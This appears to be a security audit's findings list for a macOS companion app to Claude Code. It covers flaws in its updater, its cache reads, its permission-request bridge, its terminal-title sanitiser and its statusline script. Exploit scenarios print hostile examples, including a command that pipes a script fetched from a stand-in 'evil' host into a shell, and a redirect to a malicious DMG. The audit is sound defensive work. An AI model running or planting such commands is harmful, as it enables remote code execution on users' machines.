findings.description: The on-disk destination is `FileManager.default.temporaryDirectory.appendingPathComponent(url.lastPathComponent)` (lines 41-42), where url is the fully attacker-controlled browserDownloadURL from the release JSON (F-013). The code then does removeItem(at: dest) (line 62) then moveItem(at: tmpURL, to: dest) (line 63), and the cache-hit branch (lines 44-48) does fileExists then opener(dest) directly — opening whatever is already at that path with no download or integrity check. The unsanitized-server-filename pattern is real. However, the arbitrary-file-overwrite impact is largely neutered by Foundation behavior: URL.lastPathComponent returns a single component with no embedded path separators, and `appendingPathComponent("..")` names a directory (the move would fail), so a single-component value cannot realistically overwrite an arbitrary file outside temporaryDirectory. The residual real angle is the cache-hit branch opening a same-uid-pre-planted file in tmp without any download.
findings.exploit_scenario: A compromised release sets the .dmg asset's browser_download_url last segment to a name colliding with a file a same-uid process pre-planted in temporaryDirectory; the cache-hit branch (fileExists → opener) then opens the planted disk image with no download or verification.
findings.recommendation: Do not derive the destination filename from the server URL. Use a fixed app-private filename (e.g. <appsupport>/Updates/ZackEyes-<validated-version>.dmg) in a directory the app creates with restrictive perms, and assert the resolved dest is inside the intended dir.
findings.confidence_reason: Unsanitized server-controlled filename pattern is real, but single-component lastPathComponent plus `..` naming a directory means the remove+move can't realistically overwrite an arbitrary file outside tmp; impact is mostly theoretical, cache-hit angle needs a same-uid pre-planted file.

findings.title: DMG written to predictable shared tmp path then opened — same-uid TOCTOU swap / cache-poison before NSWorkspace.open
findings.description: The DMG is written to temporaryDirectory.appendingPathComponent(url.lastPathComponent) (lines 41-42) — a predictable path (the filename is the attacker-known public asset name) — then opened with opener(dest) → NSWorkspace.shared.open (lines 64-65). There is a window between moveItem (line 63) and open (line 65). The cache-hit fast path (lines 44-48) checks fileExists then opens with no integrity check at all. macOS tmp is per-user but writable by any same-uid process. A same-uid process can replace dest with a different disk image after the move but before the open, or pre-seed the cache path so the cache-hit branch opens attacker content with no network fetch. There is no file-handle-based open, no re-verification, and no checksum compare (grep confirms zero sha256/checksum references — the published SHA-256 is never fetched or compared by the app).
findings.exploit_scenario: A same-uid process watches the predictable tmp path (filename known from the public release asset name); when the updater writes the DMG it swaps the file for a malicious disk image in the window before NSWorkspace.open. Or it pre-creates the path so the next 'Install Update' click takes the cache-hit branch and opens the planted file with no download at all.
findings.recommendation: Write the DMG into a freshly created, app-private, mode-0700 directory unique per download (mkdtemp-style) rather than shared predictable tmp; verify a fetched checksum/signature on the bytes immediately before open; do not reuse a cache path for the open without re-verifying contents.
findings.confidence_reason: Real predictable-path + move→open race and no-integrity cache-hit open are confirmed in code, but same-uid is trusted-by-design here and the primitive is largely subsumed by the 'no integrity check' finding, making it credible-but-marginal.

findings.title: Pricing/usage cache readers under ~/.zackeyes use uncapped Data(contentsOf:) on same-uid-writable JSON
findings.description: PricingStore.loadInitial reads ~/.zackeyes/pricing-cache.json with `(try? Data(contentsOf: cacheURL))` and no size cap (line 49); UsageTracker.loadFromCache does the same for ~/.zackeyes/usage-cache.json (UsageTracker.swift:222). Both then JSONDecoder().decode(...). These caches are same-uid-writable (also written back via data.write(to:)). A planted multi-GB cache file is read fully into memory and handed to JSONDecoder. Smaller blast radius than the transcript readers — these load once at startup (pricing-cache also refreshes on a newer remote version) — but the read is unbounded, contrary to the cap-every-read goal. ConfigStore's FileManager.contents(atPath:) reads are the same class but config.json is a tiny operator-managed file; lower priority.
findings.exploit_scenario: A same-uid process writes a 3GB ~/.zackeyes/pricing-cache.json; on next launch loadInitial Data(contentsOf:)-reads the entire 3GB before JSON parse fails, spiking memory at startup. Repeatable across relaunches.
findings.recommendation: Stat the cache files and skip (fall back to bundled/empty) above a small ceiling — these are tiny JSON documents, so a ~1MB cap is generous. Apply the same to usage-cache.json and config.json.
findings.confidence_reason: Real uncapped Data(contentsOf:) confirmed at both lines, but same-uid-writable cache source (trusted writer) + one-shot startup availability-only impact make it a borderline LOW that triage may downgrade.

findings.title: No wall-clock timeout on the blocking PermissionRequest read can hang the agent on a wedged or hostile app
findings.description: For a blocking PermissionRequest the bridge calls sendAndWaitForResponse(..., timeoutSeconds: 0) (main.swift:119), which maps to poll(&pfd, 1, -1) — wait forever (SocketClient.swift:101-103). The design intent is legitimate (the user may take minutes; SIGINT kills the bridge; the server side also waits forever). But the bridge holds Claude Code's hook open for the entire duration: if the listening peer accepts the connection, never POLLHUPs, and never replies, the agent's permission prompt is blocked indefinitely with no ceiling. The only escape is the user killing Claude Code. A peer that accept()s but stalls (a wedged app build, or — combined with F-006 — a hostile squatter) wedges the agent. Distinct from F-006 as a standalone defense-in-depth note: even a trusted same-uid app that hangs silently freezes every permission prompt rather than failing open to CC's native flow.
findings.exploit_scenario: The ZackEyes app deadlocks (or, per F-006, an attacker squats the socket and accept()s without replying). The bridge connects, sends the PermissionRequest, and poll(-1) blocks forever; the user must SIGINT the whole agent session, and every subsequent permission request hangs the same way until the app is killed.
findings.recommendation: Apply a generous but finite wall-clock ceiling (a few minutes) to the blocking read so a wedged/hostile peer fails open to CC's own permission prompt; keep the POLLHUP-aware early wake. If an unbounded wait must stay, gate it on the peer being credential-verified (F-006).
findings.confidence_reason: Mechanism is real and code-verified, but it's an intentional/documented blocking design with single-user, user-recoverable (SIGINT) availability impact whose hostile variant depends on the socket-squat precondition — marginal as a standalone security finding.

findings.title: Default URLSession follows cross-origin HTTP redirects on the DMG download with no redirect delegate
findings.description: UpdateDownloader.download uses `URLSession.shared.download(from: url)` (line 52) with the shared session and no URLSessionDelegate. There is no custom URLSession config or willPerformHTTPRedirection delegate anywhere (grep: zero matches outside the shared-session calls). Default Foundation behavior follows up to ~16 redirects automatically including cross-origin, transparently. The 2xx status guard (lines 56-61) inspects only the FINAL response after all redirects, so it cannot detect that bytes came from a different host than url. The same applies to the checker's URLSession.shared.data(for:). This compounds F-013: even if the asset URL were constrained to github.com, a redirect to an arbitrary host would be followed silently and the resulting body opened as a DMG. (Legitimate GitHub asset delivery DOES redirect github.com → CDN, so hardening requires an allowlist, not blanket redirect disabling — making this partly defense-in-depth, and the SSRF label is loose for a desktop updater.)
findings.exploit_scenario: A download URL on a github.com endpoint (or any host the attacker can get a 302 from) responds 302 → https://evil.example/payload.dmg. The default session follows the redirect, the final 200 passes the 2xx guard, the attacker bytes are written to tmp and opened by Finder; the app never observes that the served host differs from the requested host.
findings.recommendation: Attach a URLSessionDelegate to a non-shared URLSession and implement willPerformHTTPRedirection to reject (completion with nil) any redirect whose target host is not in the GitHub/CDN allowlist. Validate the final response URL host as well.
findings.confidence_reason: Technically accurate (no redirect delegate, final-response-only 2xx guard confirmed), but it is a defense-in-depth corollary of the verbatim-download-URL finding with inapt SSRF framing — a triager folds it in rather than keeping it as a distinct MEDIUM.

findings.title: OSC sanitizer does not strip C1 controls or the 2-byte ST terminator
findings.description: TerminalTitleWriter.sanitizePrompt (lines 19-34) and the duplicate TerminalLocator.sanitizeTitlePrompt (lines 317-329) drop scalars with value < 0x20 or == 0x7F and map newline/cr/tab to space — correctly removing bare BEL (0x07) and ESC (0x1B). Residual: C1 controls U+0080-U+009F are NOT stripped, notably U+009C (ST) and U+009B (CSI), which some terminals accept as single-byte equivalents of ESC \ and ESC [. However, the title is written via .data(using: .utf8) (line 100), so U+009C is emitted as the 2-byte UTF-8 sequence 0xC2 0x9C, which a UTF-8 terminal decodes back to the codepoint as a character, NOT an 8-bit C1 control. Exploitation therefore requires a legacy non-UTF-8 / 8-bit-C1 terminal (the documented target Ghostty is UTF-8-only). Valid defense-in-depth sanitizer-completeness note, not a credible injection on conforming terminals.
findings.exploit_scenario: On a terminal configured to interpret 8-bit C1 controls (non-UTF-8 mode), a prompt/basename containing U+009C closes the OSC-2 string and subsequent attacker bytes are parsed as terminal commands despite passing the current sanitizer. Narrow precondition.
findings.recommendation: Extend both sanitizers to also drop the C1 range (0x80-0x9F) in addition to C0/DEL. Consider switching to an allowlist (printable + small whitelist) so future Unicode control/format characters (bidi overrides) are excluded by default.
findings.confidence_reason: Sanitizer gap is real and accurately described, but UTF-8 encoding at the write boundary emits U+009C as 0xC2 0x9C, so it never reaches a UTF-8 terminal as an 8-bit C1 ST — valid defense-in-depth note, not a credible injection.

findings.title: statusline-mux interpolates the existing settings.json statusLine command raw/unquoted into a deployed shell script
findings.description: deployStatusLineMux(originalCommand:) builds the mux script by interpolating the preserved third-party statusLine.command WITHOUT any quoting (lines 351-354, acknowledged by the comment at 346-348): `displayCommand = "printf '%s\n' \"$INPUT\" | \(originalCommand)"`, baked into ~/.zackeyes/bin/statusline-mux which Claude Code executes on every statusline tick. originalCommand flows from settings.json statusLine.command (read at install) or the ~/.zackeyes/.statusline-original marker (readMuxOriginalCommand). Any shell metacharacters execute. However, both input sources are same-uid/operator-controlled: settings.json statusLine.command is the user's own configured renderer (and IS a full shell command string by design, evaluated exactly as Claude Code would), and .statusline-original is a ZackEyes marker in ~/.zackeyes/. An attacker who can write either already has same-uid write to the exec'd mux script and to settings.json directly — so the raw interpolation crosses no privilege boundary; it is a quoting defect, not a credible injection.
findings.exploit_scenario: An attacker writes ~/.zackeyes/.statusline-original containing `cat; curl http://evil/x|sh` (or sets settings.json statusLine.command to that, then triggers a re-install). The next install/repair that hits the mux branch bakes that string raw into statusline-mux, and every statusline render executes the injected pipeline — but the attacker already had same-uid write to the script.
findings.recommendation: Persist the original command as an argv array (or base64) and re-invoke via explicit sh -c only after validating provenance, or restrict the mux to invoking a fixed statusline-user script as the no-original branch already does. Lock .statusline-original to 0600 in an owner-only dir.
findings.confidence_reason: Real unquoted interpolation, but every input source is same-uid/operator-controlled and the attacker already has write access to the exec'd mux script and settings.json — no privilege boundary crossed, so it's a low-value quoting defect rather than a credible injection.

findings.title: No download size cap and no per-download timeout on the DMG fetch
findings.description: URLSession.shared.download(from: url) (line 52) uses the shared session with no URLSessionConfiguration, so no timeoutIntervalForResource, no timeoutIntervalForRequest, and no byte cap. (The checker sets request.timeoutInterval = 15 at UpdateChecker.swift:86; the downloader sets nothing.) Because the destination host can be attacker-controlled (F-013) and redirects are followed silently (F-022), a malicious host can stream an unbounded body filling tmp/disk, or hold the connection open indefinitely (the .downloading re-entrance gate at line 39 keeps the install action wedged). Availability-only (T7-adjacent) and a corollary of the malicious-host primitive already flagged.
findings.exploit_scenario: A compromised release points the DMG at an attacker host that serves an infinite/very large stream; the app fills the disk and/or the .downloading state never resolves, wedging the updater.
findings.recommendation: Use a dedicated URLSession with a configuration that sets timeoutIntervalForResource (e.g. 120s) and enforce a maximum expected DMG size (abort via a delegate when bytes exceed a cap, or validate Content-Length against a ceiling before committing the move).
findings.confidence_reason: Verified-real but availability-only DoS that is a corollary of an already-flagged malicious-host primitive, requires T2 compromise, and adds near-zero incremental signal.

findings.title: Tailer offset never reset on in-place truncation/rotation — silent stall and mid-record resume
findings.description: readNewBytes guards `endSize > offset` then seeks to offset and reads to EOF, setting offset = endSize (lines 613-617). The watcher opens the fd once (O_EVTONLY) and tails by byte offset; offset is only ever written at init (line 560) and as offset = endSize (617) — no re-stat, no inode/identity check, no shrinkage detection. If a same-uid process truncates the rollout in place (not unlink/rename, which .delete/.rename catch and cancel, lines 572-575), endSize < offset and the guard makes the watcher permanently silent for that file even as new content is appended past the old offset (the user stops getting task-complete notifications). If the file is truncated then re-grown past the old offset, reads resume from a stale byte position, slicing into the middle of a new record and feeding a corrupted partial line into pendingBuffer (compounding F-009). Primarily a correctness/availability degradation, not a corruption primitive.
findings.exploit_scenario: A same-uid process truncates the active rollout ZackEyes is tailing to 0, then appends fresh event_msg lines; the tailer's offset still points past the new EOF, so the watcher goes silent, and once the file regrows past the stale offset reads resume mid-record producing garbage partials.
findings.recommendation: Detect shrinkage: if endSize < offset, treat it as rotation/truncation — reset offset (to 0 or current EOF) and clear pendingBuffer, or cancel and re-attach the watcher. Optionally fstat the fd on each event to detect in-place replacement.
findings.confidence_reason: Mechanism is real and accurately described, but it requires a same-uid (trusted-by-design) attacker and yields only UI staleness / dropped notifications / garbage partials — a robustness/correctness bug, not a security primitive.

findings.title: Version parser accepts unbounded numeric components enabling a forced-update lever
findings.description: parseVersion (lines 128-133) strips a leading v, splits on ., compactMaps each part through Int($0); the guard requires parts.count == split count, so any non-numeric component makes parseVersion return [] and isNewer return false (fail-closed for malformed — the safe direction). isNewer is strict-greater (no downgrade). Int($0) accepts arbitrarily large Int64-fitting values with no upper bound or component cap, so a crafted tag like v9999999999.0.0 guarantees isNewer==true against any real local version, forcing the 'update available' notification and install affordance. But this requires the same release-JSON compromise (T2) that already lets the attacker set the malicious DMG URL — and such an attacker can simply publish a normally-numbered higher version to trigger the legitimate path. No independent exploitability beyond release compromise; the comparator behaves sensibly under its own threat model.
findings.exploit_scenario: A compromised release sets tag_name to v9999999999.0.0; isNewer returns true against any installed version, so every client surfaces the update notification and install action — but a real version bump would do the same, so the trick adds nothing the release compromise doesn't already grant.
findings.recommendation: Cap component count and per-component magnitude, and treat the version compare as advisory only — never let it be the sole gate on what gets downloaded. The integrity gate (checksum/signature on the DMG) must be independent of the version string.
findings.confidence_reason: Mechanically accurate but the forced-update lever is a negligible corollary of release compromise — an attacker controlling the release JSON already sets the malicious DMG and can bump the version legitimately, so the unbounded-tag edge adds no independent exploitability.

findings.title: Bridge stdin uses single availableData read — no memory blowup, exit-0 invariant holds (coverage note)
findings.description: The bridge reads stdin via FileHandle.standardInput.availableData (line 22) — a single read of whatever is buffered, not a loop to EOF — so there is NO unbounded-accumulation memory blowup (the T7 concern is absent on this path). The flip side is a benign correctness footgun: a payload larger than the single chunk is truncated, JSONSerialization fails on the partial bytes, and the bridge exits 0 silently (lines 65-67). Every malformed/oversized/non-object path preserves the never-nonzero-exit invariant (each guard is exit(0)). No crafted input was found that makes the bridge exit non-zero or trap. Reported as a low-signal coverage note documenting that this path is safe; for a PermissionRequest a dropped event fails to CC's own prompt (safe default).
findings.exploit_scenario: A hook delivers a multi-MB JSON payload; availableData returns only the first chunk; the JSON parse fails; the bridge exits 0 with empty stdout and the event is dropped. No crash, no nonzero exit, no memory blowup — for a PermissionRequest this fails to CC's native prompt.
findings.recommendation: If full-payload fidelity matters, loop reads to EOF with an explicit upper bound (cap at a few MB, exit 0 if exceeded) instead of relying on a single availableData chunk — this removes the silent-truncation footgun and keeps a hard cap. No security change required for the exit-0 invariant, which already holds.
findings.confidence_reason: Self-described coverage note that concludes the path is safe — no memory blowup, exit-0 invariant verified, truncation fails to a safe default; not a vulnerability.
